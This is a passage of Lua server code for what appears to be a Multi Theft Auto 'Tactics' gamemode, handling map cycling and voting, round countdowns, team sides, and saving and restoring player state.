            local currentSides = getTacticsData("Sides") or {};
            for currentSideIndex, currentSideTeam in ipairs(currentSides) do
                if currentSideTeam == teamToRemove then
                    table.remove(currentSides, currentSideIndex);
                end;
            end;
            setTacticsData(currentSides, "Sides");
            local updatedTeamSides = {};
            for updateIndex, updateTeam in ipairs(currentSides) do
                updatedTeamSides[updateTeam] = updateIndex;
            end;
            setTacticsData(updatedTeamSides, "Teamsides");
            return destroyElement(teamToRemove);
        end;
    end;
    convertWeaponSkillToNames = {
        [69] = "colt45", 
        [70] = "silenced", 
        [71] = "deagle", 
        [72] = "shotgun", 
        [73] = "sawnoff", 
        [74] = "spaz12", 
        [75] = "uzi", 
        [76] = "mp5", 
        [77] = "ak47", 
        [78] = "m4", 
        [79] = "sniper"
    };
    convertWeaponNamesToSkill = {
        colt45 = 69, 
        silenced = 70, 
        deagle = 71, 
        shotgun = 72, 
        sawnoff = 73, 
        spaz12 = 74, 
        uzi = 75, 
        mp5 = 76, 
        ak47 = 77, 
        m4 = 78, 
        sniper = 79
    };
    applyStats = function(targetPlayer) 
        for weaponStatID in pairs(convertWeaponSkillToNames) do
            setPedStat(targetPlayer, weaponStatID, 999);
        end;
        local additionalStats = {
            [22] = 999, 
            [225] = 999, 
            [160] = 999, 
            [229] = 999, 
            [230] = 999
        };
        for statID, statValue in pairs(additionalStats) do
            setPedStat(targetPlayer, statID, statValue);
        end;
    end;
    fixPlayerID = function(playerElement) 
        if getElementID(playerElement) ~= "" then
            return false;
        else
            local newPlayerID = 1;
            while getElementByID(tostring(newPlayerID)) do
                newPlayerID = newPlayerID + 1;
            end;
            setElementID(playerElement, tostring(newPlayerID));
            return newPlayerID;
        end;
    end;
    setSideNames = function(sideName1, sideName2) 
        local currentSideNames = getTacticsData("SideNames") or {"", ""};
        if not sideName1 then
            sideName1 = currentSideNames[1];
        end;
        if not sideName2 then
            sideName2 = currentSideNames[2];
        end;
        setTacticsData({sideName1, sideName2}, "SideNames");
    end;
    onResourceStop = function(_) 
        for _, playerToClean in ipairs(getElementsByType("player")) do
            setElementData(playerToClean, "Status", nil);
        end;
    end;
    onResourceStart = function(startedResource) 
        if getThisResource() == startedResource then
            setGameType("Tactics " .. getTacticsData("version"));
            setTacticsData({
                "Attack", 
                "Defend"
            }, "SideNames");
            if not fileExists("config/configs.xml") then
                local configsFile = xmlCreateFile("config/configs.xml", "configs");
                local currentConfigNode = xmlCreateChild(configsFile, "current");
                xmlNodeSetAttribute(currentConfigNode, "src", "_default");
                xmlSaveFile(configsFile);
                xmlUnloadFile(configsFile);
                if fileExists("config/_default.xml") then
                    fileDelete("config/_default.xml");
                end;
                defaultConfig(true);
            else
                local currentConfigName = getCurrentConfig();
                defaultConfig(true);
                startConfig(currentConfigName, true);
            end;
            local allDataKeys = {};
            for dataKeyName in pairs(getAllElementData(getElementByID("Tactics"))) do
                table.insert(allDataKeys, dataKeyName);
            end;
            setTacticsData(allDataKeys, "AllData");
            for _, playerInList in ipairs(getElementsByType("player")) do
                fixPlayerID(playerInList);
                applyStats(playerInList);
            end;
            setTimer(nextMap, 50, 1);
        elseif getResourceInfo(startedResource, "type") == "map" and getResourceName(startedResource) == getTacticsData("MapResName") then
            local mapInfo = {
                modename = getTacticsData("Map"), 
                name = getTacticsData("MapName", false) or "unnamed", 
                author = getTacticsData("MapAuthor", false), 
                resname = getResourceName(startedResource), 
                resource = startedResource
            };
            triggerEvent("onMapStarting", root, mapInfo, {}, {
                statsKey = "name"
            });
            local mapNameText = getTacticsData("MapName", false);
            outputServerLog("* Change map to " .. mapNameText);
        end;
    end;
    onMapStarting = function(_) 
        waitingTimer = "wait";
        local timeSeconds = TimeToSec(getTacticsData("settings", "time") or "12:00");
        setTime(math.floor(timeSeconds / 60), timeSeconds - 60 * math.floor(timeSeconds / 60));
        for _, playerInLoop in ipairs(getElementsByType("player")) do
            removeElementData(playerInLoop, "RespawnLives");
        end;
    end;
    onResourcePreStart = function(preStartResource) 
        if getResourceInfo(preStartResource, "type") == "map" then
            local definedModes = getTacticsData("modes_defined") or {};
            local modeType = false;
            for modePattern in pairs(definedModes) do
                if string.find(getResourceName(preStartResource), modePattern) == 1 then
                    modeType = modePattern;
                end;
            end;
            if modeType then
                local currentMapInfo = {
                    modename = getTacticsData("Map"), 
                    name = getTacticsData("MapName", false) or "unnamed", 
                    author = getTacticsData("MapAuthor", false), 
                    resname = getTacticsData("MapResName")
                };
                triggerClientEvent(root, "onClientMapStopping", root, currentMapInfo);
                triggerEvent("onMapStopping", root, currentMapInfo);
                local formattedName = getResourceInfo(preStartResource, "name");
                if not formattedName then
                    formattedName = string.sub(string.gsub(getResourceName(preStartResource), "_", " "), #modeType + 2);
                    if #formattedName > 1 then
                        formattedName = string.upper(string.sub(formattedName, 1, 1)) .. string.sub(formattedName, 2);
                    end;
                end;
                formattedName = string.upper(string.sub(modeType, 1, 1)) .. string.sub(modeType, 2) .. ": " .. formattedName;
                setMapName(formattedName);
                setTacticsData(modeType, "Map");
                setTacticsData(formattedName, "MapName");
                setTacticsData(getResourceInfo(preStartResource, "author"), "MapAuthor");
                setTacticsData(getResourceName(preStartResource), "MapResName");
                local mapInterior = get(getResourceName(preStartResource) .. ".Interior");
                if mapInterior then
                    setTacticsData(tonumber(mapInterior), "Interior");
                else
                    setTacticsData(0, "Interior");
                end;
                setGameSpeed(tonumber(getTacticsData("settings", "gamespeed") or 1));
                if getTacticsData("settings", "countdown_auto") == "true" then
                    setTacticsData({"", "waiting_for_other_players"}, "message");
                else
                    setTacticsData({"", "waiting_for_admin_start"}, "message");
                end;
            end;
        end;
    end;
    forcedStartRound = function(startType) 
        if getRoundState() == "started" then
            return;
        elseif not startType and isTimer(startTimer) then
            return;
        else
            if isTimer(startTimer) then
                killTimer(startTimer);
                startTimer = nil;
            end;
            if isTimer(waitingTimer) then
                killTimer(waitingTimer);
                waitingTimer = nil;
            end;
            setTacticsData(nil, "message");
            if startType == "faststart" then
                callClientFunction(root, "showCountdown", 0);
                callClientFunction(root, "fixTickCount", getTickCount());
                for _, playingPlayer in ipairs(getElementsByType("player")) do
                    if getElementData(playingPlayer, "Status") == "Play" then
                        local playerVehicle = getPedOccupiedVehicle(playingPlayer);
                        if isElement(playerVehicle) then
                            setElementFrozen(playerVehicle, false);
                        end;
                        setElementFrozen(playingPlayer, false);
                        toggleAllControls(playingPlayer, true);
                    end;
                end;
                local mapMode = getTacticsData("Map");
                local timeLimitSeconds = TimeToSec(getTacticsData("modes", mapMode, "timelimit") or "0:00");
                if timeLimitSeconds <= 0 then
                    setTacticsData(nil, "timeleft");
                    if isTimer(overtimeTimer) then
                        killTimer(overtimeTimer);
                    end;
                else
                    setTacticsData(getTickCount() + timeLimitSeconds * 1000, "timeleft");
                    if isTimer(overtimeTimer) then
                        killTimer(overtimeTimer);
                    end;
                    overtimeTimer = setTimer(triggerEvent, timeLimitSeconds * 1000, 1, "onRoundTimesup", root);
                end;
                triggerEvent("onRoundStart", root);
                triggerClientEvent(root, "onClientRoundStart", root);
            elseif startType == "notround" then
                setTacticsData(nil, "timeleft");
                if isTimer(overtimeTimer) then
                    killTimer(overtimeTimer);
                end;
                for _, playPlayer in ipairs(getElementsByType("player")) do
                    if getElementData(playPlayer, "Status") == "Play" then
                        local occupiedVehicle = getPedOccupiedVehicle(playPlayer);
                        if isElement(occupiedVehicle) then
                            setElementFrozen(occupiedVehicle, false);
                        end;
                        setElementFrozen(playPlayer, false);
                        toggleAllControls(playPlayer, true);
                    end;
                end;
                triggerEvent("onRoundStart", root);
                triggerClientEvent(root, "onClientRoundStart", root);
            else
                local countdownTime = tonumber(getTacticsData("settings", "countdown_start")) or 3;
                startTimer = setTimer(onStartCount, 2000, 1, countdownTime);
                triggerEvent("onRoundCountdownStarted", root, 2000 + countdownTime * 1000);
                for _, connectedPlayer in ipairs(getElementsByType("player")) do
                    if getElementData(connectedPlayer, "Status") then
                        triggerClientEvent(connectedPlayer, "onClientRoundCountdownStarted", root, 2000 + countdownTime * 1000);
                    end;
                end;
            end;
            return;
        end;
    end;
    onStartCount = function(countValue) 
        if countValue > 0 then
            callClientFunction(root, "showCountdown", countValue);
            startTimer = setTimer(onStartCount, 1000, 1, countValue - 1);
        else
            forcedStartRound("faststart");
        end;
    end;
    endRound = function(winningSide, endMessage, scoreChanges) 
        local pairsFunc = pairs;
        local scoreMap = scoreChanges or {};
        for teamElement, scoreChange in pairsFunc(scoreMap) do
            local currentScore = getElementData(teamElement, "Score") or 0;
            setElementData(teamElement, "Score", currentScore + scoreChange);
        end;
        triggerEvent("onRoundFinish", root, winningSide, endMessage, scoreChanges);
        triggerClientEvent(root, "onClientRoundFinish", root, winningSide, endMessage, scoreChanges);
        pairsFunc = getTacticsData("MapName", false);
        setTacticsData({winningSide, endMessage}, "message");
        if winningSide then
            scoreMap = "";
            if type(winningSide) == "table" then
                if type(winningSide[1]) == "string" then
                    local winArgs = winningSide;
                    local messageKey = table.remove(winArgs, 1);
                    scoreMap = string.format(getString(tostring(messageKey)), unpack(winArgs));
                else
                    local messageID = winningSide[4];
                    local formatArgs2 = winningSide;
                    table.remove(formatArgs2, 1);
                    table.remove(formatArgs2, 1);
                    table.remove(formatArgs2, 1);
                    table.remove(formatArgs2, 1);
                    scoreMap = string.format(getString(tostring(messageID)), unpack(formatArgs2));
                end;
            elseif type(winningSide) == "string" then
                scoreMap = getString(winningSide);
                if #scoreMap == 0 then
                    scoreMap = tostring(winningSide);
                end;
            else
                scoreMap = tostring(winningSide);
            end;
            outputServerLog("* Map " .. removeColorCoding(pairsFunc) .. " ended [" .. removeColorCoding(scoreMap) .. "]");
        else
            outputServerLog("* Map " .. removeColorCoding(pairsFunc) .. " ended");
        end;
        setTacticsData(nil, "timeleft");
        if isTimer(waitingTimer) then
            killTimer(waitingTimer);
            waitingTimer = nil;
        end;
        if isTimer(startTimer) then
            killTimer(startTimer);
            startTimer = nil;
        end;
        if isTimer(overtimeTimer) then
            killTimer(overtimeTimer);
            overtimeTimer = nil;
        end;
        if isTimer(winTimer) then
            killTimer(winTimer);
        end;
        winTimer = setTimer(nextMap, 8000, 1);
    end;
    clearMap = function() 
        setTacticsData(nil, "ResourceNext");
        setTacticsData(nil, "timeleft");
        setTacticsData(nil, "timestart");
        setTacticsData(nil, "message");
        setTacticsData(nil, "Restores");
        setTacticsData(nil, "Pause");
        if isTimer(waitingTimer) then
            killTimer(waitingTimer);
            waitingTimer = nil;
        end;
        if isTimer(startTimer) then
            killTimer(startTimer);
            startTimer = nil;
        end;
        if isTimer(winTimer) then
            killTimer(winTimer);
        end;
        winTimer = nil;
        if isTimer(overtimeTimer) then
            killTimer(overtimeTimer);
            overtimeTimer = nil;
        end;
        if isTimer(restartTimer) then
            killTimer(restartTimer);
        end;
        for wastedPlayer, wastedTimerRef in pairs(wastedTimer) do
            if isTimer(wastedTimerRef) then
                killTimer(wastedTimerRef);
                wastedTimer[wastedPlayer] = nil;
            end;
        end;
        for _, loadingPlayer in ipairs(getElementsByType("player")) do
            setElementData(loadingPlayer, "Loading", true);
        end;
        restartTimer = setTimer(nextMap, 3000, 1);
    end;
    startMap = function(mapResource, startMode) 
        if not hasObjectPermissionTo(getThisResource(), "function.startResource", false) then
            outputLangString(root, "resource_have_not_permissions", getResourceName(getThisResource()), "function.startResource");
            return;
        elseif not hasObjectPermissionTo(getThisResource(), "function.stopResource", false) then
            outputLangString(root, "resource_have_not_permissions", getResourceName(getThisResource()), "function.stopResource");
            return;
        elseif not hasObjectPermissionTo(getThisResource(), "function.restartResource", false) then
            outputLangString(root, "resource_have_not_permissions", getResourceName(getThisResource()), "function.restartResource");
            return;
        else
            local modesList = getTacticsData("modes_defined");
            local disabledMaps = getTacticsData("map_disabled") or {};
            if mapResource then
                if type(mapResource) == "string" and modesList[mapResource] then
                    local availableMaps = {};
                    for _, resourceCheck in ipairs(getResources()) do
                        if getResourceInfo(resourceCheck, "type") == "map" and string.find(getResourceName(resourceCheck), mapResource) == 1 then
                            table.insert(availableMaps, resourceCheck);
                        end;
                    end;
                    if #availableMaps > 0 then
                        local selectedResource = availableMaps[math.random(#availableMaps)];
                        startMap(selectedResource, "random");
                        return true;
                    else
                        return false;
                    end;
                else
                    if type(mapResource) == "string" then
                        mapResource = getResourceFromName(mapResource);
                    end;
                    if mapResource and getResourceInfo(mapResource, "type") == "map" then
                        if type(startMode) == "string" and startMode == "vote" then
                            local resourceName = getResourceName(mapResource);
                            local modeName = string.lower(string.sub(resourceName, 1, string.find(resourceName, "_") - 1));
                            if getTacticsData("modes", modeName, "enable") == "false" or disabledMaps[resourceName] then
                                return false;
                            end;
                        end;
                        if type(startMode) == "number" then
                            setTacticsData(startMode, "ResourceCurrent");
                        end;
                        for _, runningResource in ipairs(getResources()) do
                            if getResourceState(runningResource) == "running" and getResourceInfo(runningResource, "type") == "map" then
                                for _, mapElement in ipairs(getElementChildren(getResourceRootElement(runningResource))) do
                                    destroyElement(mapElement);
                                end;
                                if mapResource ~= runningResource then
                                    stopResource(runningResource);
                                end;
                            end;
                        end;
                        clearMap();
                        if not startResource(mapResource) then
                            restartResource(mapResource);
                        end;
                        local resourceTitle = getResourceInfo(mapResource, "name");
                        local mapResName = getResourceName(mapResource);
                        local modeKey = "";
                        for modeMatch in pairs(modesList) do
                            if string.find(mapResName, modeMatch) == 1 then
                                modeKey = modeMatch;
                                break;
                            end;
                        end;
                        if not resourceTitle then
                            resourceTitle = string.sub(string.gsub(mapResName, "_", " "), #modeKey + 2);
                            if #resourceTitle > 1 then
                                resourceTitle = string.upper(string.sub(resourceTitle, 1, 1)) .. string.sub(resourceTitle, 2);
                            end;
                        end;
                        resourceTitle = string.upper(string.sub(modeKey, 1, 1)) .. string.sub(modeKey, 2) .. ": " .. resourceTitle;
                        if type(startMode) == "string" and startMode == "random" then
                            outputLangString(root, "map_change_random", resourceTitle);
                        else
                            outputLangString(root, "map_change", resourceTitle);
                        end;
                        return true;
                    end;
                end;
            end;
            return false;
        end;
    end;
    nextMap = function() 
        if not hasObjectPermissionTo(getThisResource(), "function.startResource", false) then
            outputLangString(root, "resource_have_not_permissions", getResourceName(getThisResource()), "function.startResource");
            return;
        elseif not hasObjectPermissionTo(getThisResource(), "function.stopResource", false) then
            outputLangString(root, "resource_have_not_permissions", getResourceName(getThisResource()), "function.stopResource");
            return;
        elseif not hasObjectPermissionTo(getThisResource(), "function.restartResource", false) then
            outputLangString(root, "resource_have_not_permissions", getResourceName(getThisResource()), "function.restartResource");
            return;
        else
            local nextMapName = getTacticsData("ResourceNext");
            local disabledMapsList = getTacticsData("map_disabled") or {};
            if nextMapName then
                local nextResource = getResourceFromName(nextMapName);
                return startMap(nextResource);
            else
                if getTacticsData("automatics") == "cycler" then
                    local mapCycleList = getTacticsData("Resources");
                    if mapCycleList and #mapCycleList > 0 then
                        local currentIndex = getTacticsData("ResourceCurrent");
                        if not currentIndex or #mapCycleList <= currentIndex then
                            currentIndex = 1;
                        else
                            currentIndex = currentIndex + 1;
                        end;
                        local nextMapToLoad = mapCycleList[currentIndex][1];
                        if disabledMapsList[nextMapToLoad] then
                            return false;
                        else
                            setTacticsData(currentIndex, "ResourceCurrent");
                            return startMap(nextMapToLoad);
                        end;
                    end;
                end;
                if getTacticsData("automatics") == "lobby" then
                    local lobbyMaps = {};
                    for _, lobbyResource in ipairs(getResources()) do
                        if getResourceInfo(lobbyResource, "type") == "map" and string.find(getResourceName(lobbyResource), "lobby") == 1 and not disabledMapsList[getResourceName(lobbyResource)] then
                            table.insert(lobbyMaps, lobbyResource);
                        end;
                    end;
                    if #lobbyMaps > 0 then
                        local randomLobbyMap = lobbyMaps[math.random(#lobbyMaps)];
                        return startMap(randomLobbyMap);
                    end;
                end;
                if getTacticsData("automatics") == "voting" then
                    local modesDefined = getTacticsData("modes_defined");
                    local votingMaps = {};
                    for _, mapResourceCheck in ipairs(getResources()) do
                        if getResourceInfo(mapResourceCheck, "type") == "map" then
                            for modeKeyCheck in pairs(modesDefined) do
                                if modeKeyCheck ~= "lobby" and string.find(getResourceName(mapResourceCheck), modeKeyCheck) == 1 and getTacticsData("modes", modeKeyCheck, "enable") ~= "false" and not disabledMapsList[getResourceName(mapResourceCheck)] then
                                    table.insert(votingMaps, getResourceName(mapResourceCheck));
                                end;
                            end;
                        end;
                    end;
                    if #votingMaps > 0 then
                        local voteOptions = {};
                        for _ = 1, math.min(8, #votingMaps) do
                            local randomIndex = math.random(#votingMaps);
                            local randomMap = votingMaps[randomIndex];
                            table.remove(votingMaps, randomIndex);
                            table.insert(voteOptions, {
                                randomMap
                            });
                        end;
                        table.insert(voteOptions, {
                            getTacticsData("MapResName"), 
                            "Play again"
                        });
                        triggerEvent("onPlayerVote", root, voteOptions);
                        winTimer = "voting";
                        setGameSpeed(tonumber(getTacticsData("settings", "gamespeed") or 1));
                        return true;
                    end;
                end;
                local availableModes = getTacticsData("modes_defined");
                local allMaps = {};
                for _, allMapResource in ipairs(getResources()) do
                    if getResourceInfo(allMapResource, "type") == "map" then
                        for modeKeyAll in pairs(availableModes) do
                            if string.find(getResourceName(allMapResource), modeKeyAll) == 1 and getTacticsData("modes", modeKeyAll, "enable") ~= "false" and not disabledMapsList[getResourceName(allMapResource)] then
                                table.insert(allMaps, allMapResource);
                            end;
                        end;
                    end;
                end;
                if #allMaps > 0 then
                    local randomMapResource = allMaps[math.random(#allMaps)];
                    return startMap(randomMapResource);
                else
                    return false;
                end;
            end;
        end;
    end;
    swapTeams = function() 
        local sidesList = getTacticsData("Sides") or {};
        local allTeams = getElementsByType("team");
        table.remove(allTeams, 1);
        if #sidesList ~= #allTeams then
            sidesList = {
                unpack(allTeams)
            };
        end;
        table.insert(sidesList, sidesList[1]);
        table.remove(sidesList, 1);
        setTacticsData(sidesList, "Sides");
        local updatedSides = {};
        for newIndex, teamInList in ipairs(sidesList) do
            updatedSides[teamInList] = newIndex;
        end;
        setTacticsData(updatedSides, "Teamsides");
    end;
    onPlayerConnect = function(playerName, playerIP, _, _, _, _) 
        outputLangString(root, "connect", playerName, playerIP);
    end;
    onPlayerJoin = function() 
        setElementData(source, "Status", nil);
        fixPlayerID(source);
        applyStats(source);
        bindKey(source, "R", "down", userRestore);
    end;
    userRestore = function(playerElement2) 
        if getElementData(playerElement2, "Status") ~= "Spectate" then
            return;
        else
            local restoreList = getTacticsData("Restores") or {};
            for restoreIndex, restoreData in ipairs(restoreList) do
                if restoreData[1] == getPlayerName(playerElement2) then
                    restorePlayerLoad(playerElement2, restoreIndex);
                    return;
                end;
            end;
            local currentMapMode = getTacticsData("Map");
            if (getTacticsData("modes", currentMapMode, "respawn") or getTacticsData("settings", "respawn") or "false") == "true" then
                outputLangString(root, "add_to_round", getPlayerName(playerElement2));
                triggerEvent("onPlayerRoundRespawn", playerElement2);
            end;
            return;
        end;
    end;
    onPlayerDownloadComplete = function() 
        callClientFunction(client, "fixTickCount", getTickCount());
        callClientFunction(client, "setTime", getTime());
        setElementData(client, "Status", "Joining");
        if isRoundPaused() then
            fadeCamera(client, true, 0);
        else
            fadeCamera(client, true, 2);
        end;
    end;
    onPlayerMapLoad = function() 
        local playerTeam = getPlayerTeam(client);
        if not playerTeam or getElementData(client, "ChangeTeam") then
            setPlayerTeam(client, nil);
            setElementData(client, "ChangeTeam", nil);
            setElementData(client, "Status", "Joining");
        elseif playerTeam == getElementsByType("team")[1] or getElementData(client, "spectateskin") then
            spawnPlayer(client, 0, 0, 0, 0, getElementModel(client), 0, 0, playerTeam);
            setElementData(client, "Status", "Spectate");
            callClientFunction(client, "setCameraSpectating", nil, "playertarget");
        else
            triggerEvent("onPlayerRoundSpawn", client);
        end;
        triggerClientEvent(root, "onClientPlayerBlipUpdate", client);
    end;
    onPlayerMapReady = function() 
        if getRoundState() == "stopped" and client then
            local playerCurrentTeam = getPlayerTeam(client);
            if playerCurrentTeam and playerCurrentTeam ~= getElementsByType("team")[1] and not getElementData(client, "spectateskin") then
                setElementData(client, "Status", "Play");
            end;
        end;
        if getRoundState() ~= "started" and getTacticsData("settings", "countdown_auto") == "true" then
            if not getUnreadyPlayers() or getUnreadyPlayers() == client then
                forcedStartRound();
            elseif waitingTimer == "wait" then
                waitingTimer = setTimer(forcedStartRound, 1000 * TimeToSec(getTacticsData("settings", "countdown_force") or "0:10"), 1);
            end;
        end;
    end;
    onPlayerTeamSelect = function(selectedTeam, selectedSkin, adm) 
        if not selectedTeam then
            local sortedTeams = getElementsByType("team");
            table.remove(sortedTeams, 1);
            table.sort(sortedTeams, function(teamA, teamB) 
                return countPlayersInTeam(teamA) < countPlayersInTeam(teamB);
            end);
            selectedTeam = sortedTeams[1];
        end;
        setPlayerTeam(source, selectedTeam);
        if not selectedSkin or type(selectedSkin) ~= "number" then
            local skins = getElementData(selectedTeam, "Skins")
            if type(skins) == "table" and type(skins[1]) == "number" then
                selectedSkin = skins[1]
            else
                selectedSkin = 71
            end
        end;
        setElementModel(source, selectedSkin);
        if selectedTeam == getElementsByType("team")[1] or getElementData(source, "spectateskin") then
            spawnPlayer(source, 0, 0, 0, 0, selectedSkin, 0, 0, selectedTeam);
            setElementData(source, "Status", "Spectate");
            callClientFunction(source, "setCameraSpectating", nil, "playertarget");
        else
            triggerEvent("onPlayerRoundSpawn", source);
        end;
        if not getElementData(source, "Loading") then
            fadeCamera(source, true, 2);
            triggerEvent("onPlayerMapReady", source);
        end;
        triggerClientEvent(root, "onClientPlayerBlipUpdate", source);
    end;
    onPlayerRoundSpawn = function() 
        triggerClientEvent(root, "onClientPlayerRoundSpawn", source);
    end;
onPlayerRoundRespawn = function() 
    if isTimer(wastedTimer[client]) then
        killTimer(wastedTimer[client])
    end
    
    local sourceElement = client
    
    if not sourceElement or (not isElement(sourceElement) and sourceElement ~= root and sourceElement ~= getRootElement()) then
        return false
    end
    
    local success, result = pcall(function()
        return triggerClientEvent(root, "onClientPlayerRoundRespawn", sourceElement)
    end)
    
    if not success then
        return false
    end
    
    return result
end
    onPlayerSpawn = function() 
        giveWeapon(source, 44);
        takeWeapon(source, 44);
        applyStats(source);
        local startHealth = tonumber(getTacticsData("settings", "player_start_health"));
        local startArmour = tonumber(getTacticsData("settings", "player_start_armour"));
        setElementHealth(source, startHealth);
        setPedArmor(source, startArmour);
    end;
    onPlayerQuit = function(quitReason, quitExtraInfo, _) 
        if getElementData(source, "Status") == "Play" and getTacticsData("Map") ~= "lobby" and getTacticsData("settings", "timeout_to_pause") == "true" then
            triggerEvent("onPause", root, true);
        end;
        if (isTimer(waitingTimer) or waitingTimer == "wait") and getTacticsData("settings", "countdown_auto") == "true" and (not getUnreadyPlayers() or getUnreadyPlayers() == source) then
            forcedStartRound();
        end;
        if quitExtraInfo then
            quitExtraInfo = " [" .. quitExtraInfo .. "]";
        else
            quitExtraInfo = "";
        end;
        if restorePlayerSave(source) then
            outputLangString(root, "disconnect_save", getPlayerName(source), quitReason, quitExtraInfo);
        else
            outputLangString(root, "disconnect", getPlayerName(source), quitReason, quitExtraInfo);
        end;
    end;
    local nickChangeProtection = {};
    onPlayerChangeNick = function(oldNickname, newNickname) 
        if nickChangeProtection[source] and nickChangeProtection[source] > getTickCount() - 5000 then
            cancelEvent();
            outputLangString(source, "change_nick_cancel");
            return;
        else
            nickChangeProtection[source] = getTickCount();
            outputLangString(root, "change_nick", tostring(oldNickname), tostring(newNickname));
            return;
        end;
    end;
    onRoundTimesup = function() 
        triggerClientEvent(root, "onClientRoundTimesup", root);
    end;
    restorePlayerSave = function(playerToSave) 
        if not isElement(playerToSave) or getElementData(playerToSave, "Status") ~= "Play" or getElementData(playerToSave, "Loading") or not getPlayerTeam(playerToSave) then
            return false;
        else
            local restoreDataList = getTacticsData("Restores") or {};
            local playerNickname = getPlayerName(playerToSave);
            local playerSaveTeam = getPlayerTeam(playerToSave) or nil;
            local playerSaveSkin = getElementModel(playerToSave);
            local playerSaveHealth = getElementHealth(playerToSave);
            local playerSaveArmor = getPedArmor(playerToSave);
            local playerSaveInterior = getElementInterior(playerToSave);
            local playerSaveWeapons = {};
            for weaponSlot = 0, 12 do
                local weaponId = getPedWeapon(playerToSave, weaponSlot);
                local totalAmmo = getPedTotalAmmo(playerToSave, weaponSlot);
                local clipAmmo = getPedAmmoInClip(playerToSave, weaponSlot);
                if weaponId > 0 and totalAmmo > 0 then
                    table.insert(playerSaveWeapons, {
                        weaponId, 
                        totalAmmo, 
                        clipAmmo
                    });
                end;
            end;
            local currentWeaponSlot = getPedWeaponSlot(playerToSave);
            local savePosX = 0;
            local savePosY = 0;
            local savePosZ = 0;
            local saveRotation = 0;
            local saveVelX = 0;
            local saveVelY = 0;
            local saveVelZ = 0;
            local isOnFire = false;
            local vehicleSeat = 0;
            local playerVehicle = getPedOccupiedVehicle(playerToSave);
            if not playerVehicle then
                local tempPosX, tempPosY, tempPosZ = getElementPosition(playerToSave);
                savePosZ = tempPosZ;
                savePosY = tempPosY;
                savePosX = tempPosX;
                saveRotation = getPedRotation(playerToSave);
                tempPosX, tempPosY, tempPosZ = getElementVelocity(playerToSave);
                saveVelZ = tempPosZ;
                saveVelY = tempPosY;
                saveVelX = tempPosX;
                isfire = isElementOnFire(playerToSave);
            else
                vehicleSeat = getPedOccupiedVehicleSeat(playerToSave);
            end;
            local playerAllData = getAllElementData(playerToSave) or {};
            table.insert(restoreDataList, {
                playerNickname, 
                playerSaveTeam, 
                playerSaveSkin, 
                playerSaveHealth, 
                playerSaveArmor, 
                playerSaveInterior, 
                playerSaveWeapons, 
                currentWeaponSlot, 
                playerVehicle, 
                savePosX, 
                savePosY, 
                savePosZ, 
                saveRotation, 
                saveVelX, 
                saveVelY, 
                saveVelZ, 
                isOnFire, 
                vehicleSeat, 
                playerAllData
            });
            setTacticsData(restoreDataList, "Restores");
            triggerEvent("onPlayerStored", playerToSave, #restoreDataList);
            return #restoreDataList;
        end;
    end;
    restorePlayerLoad = function(playerToRestore, restoreIndex) 
        local restoreDataArray = getTacticsData("Restores");
        if isElement(playerToRestore) and restoreDataArray[restoreIndex] then
            local restoredName, restoredTeam, restoredSkin, restoredHealth, restoredArmor, restoredInterior, restoredWeapons, restoredWeaponSlot, restoredVehicle, restoredPosX, restoredPosY, restoredPosZ, restoredRotation, restoredVelX, restoredVelY, restoredVelZ, restoredOnFire, restoredSeat, restoredData = unpack(restoreDataArray[restoreIndex]);
            setCameraTarget(playerToRestore, playerToRestore);
            spawnPlayer(playerToRestore, restoredPosX, restoredPosY, restoredPosZ, restoredRotation, restoredSkin, restoredInterior, 0, restoredTeam);
            callClientFunction(source, "setCameraInterior", restoredInterior);
            setElementHealth(playerToRestore, restoredHealth);
            setPedArmor(playerToRestore, restoredArmor);
            for _, weaponEntry in ipairs(restoredWeapons) do
                giveWeapon(playerToRestore, weaponEntry[1], weaponEntry[3]);
                if weaponEntry[2] > weaponEntry[3] then
                    giveWeapon(playerToRestore, weaponEntry[1], weaponEntry[2] - weaponEntry[3]);
                end;
            end;
            setPedWeaponSlot(playerToRestore, restoredWeaponSlot);
            if restoredVehicle then
                warpPedIntoVehicle(playerToRestore, restoredVehicle, restoredSeat);
            else
                setElementVelocity(playerToRestore, restoredVelX, restoredVelY, restoredVelZ);
                setElementOnFire(playerToRestore, restoredOnFire);
            end;
            for dataKey, dataValue in pairs(restoredData) do
                if dataKey ~= "ID" then
                    setElementData(playerToRestore, dataKey, dataValue);
                end;
            end;
            fadeCamera(playerToRestore, true, 0);
            outputLangString(root, "player_restored", getPlayerName(playerToRestore), restoredName);
            triggerEvent("onPlayerRestored", playerToRestore, restoreIndex);
            return true;
        else
            return false;
        end;
    end;
    getRestoreCount = function() 
        return #(getTacticsData("Restores") or {});
    end;
    getRestoreData = function(restoreDataIndex) 
        local restoreEntries = getTacticsData("Restores") or {};
        if not restoreEntries[restoreDataIndex] then
            return false;
        else
            local restoreName, restoreTeam, restoreSkin, restoreHealth, restoreArmour, restoreInterior, restoreWeapons, restoreWeaponSlot, restoreVehicle, restorePosX, restorePosY, restorePosZ, restoreRotation, restoreVelX, restoreVelY, restoreVelZ, restoreOnFire, restoreSeat, restoreData = unpack(restoreEntries[restoreDataIndex]);
            return {
                name = restoreName, 
                posX = restorePosX, 
                posY = restorePosY, 
                posZ = restorePosZ, 
                rotation = restoreRotation, 
                interior = restoreInterior, 
                team = restoreTeam, 
                skin = restoreSkin, 
                health = restoreHealth, 
                armour = restoreArmour or 0, 
                velocityX = restoreVelX or 0, 
                velocityY = restoreVelY or 0, 
                velocityZ = restoreVelZ or 0, 
                onfire = restoreOnFire or false, 
                weapons = restoreWeapons or {}, 
                weaponslot = restoreWeaponSlot or 0, 
                vehicle = restoreVehicle or nil, 
                vehicleseat = restoreSeat or nil, 
                data = restoreData or {}
            };
        end;
    end;
    onPlayerWeaponpackChose = function(weaponpackPlayer, weaponpackSelection) 
        if getRoundState() ~= "started" then
            return;
        else
            takeAllWeapons(weaponpackPlayer);
            local weaponBalance = getTacticsData("weapon_balance") or {};
            local defaultWeaponSlot = 0;
            for _, weaponInfo in ipairs(weaponpackSelection) do
                if weaponInfo.id then
                    local playerWeaponTeam = getPlayerTeam(weaponpackPlayer);
                    local weaponTypeSlot = getSlotFromWeapon(weaponInfo.id);
                    if weaponBalance[weaponInfo.name] and playerWeaponTeam then
                        local weaponCount = 0;
                        for _, teammatePlayer in ipairs(getPlayersInTeam(playerWeaponTeam)) do
                            if getPedWeapon(teammatePlayer, weaponTypeSlot) == weaponInfo.id then
                                weaponCount = weaponCount + 1;
                            end;
                        end;
                        if tonumber(weaponBalance[weaponInfo.name]) <= weaponCount then
                            outputLangString(weaponpackPlayer, "weapon_limited", weaponInfo.name, tonumber(weaponBalance[weaponInfo.name]));
                        else
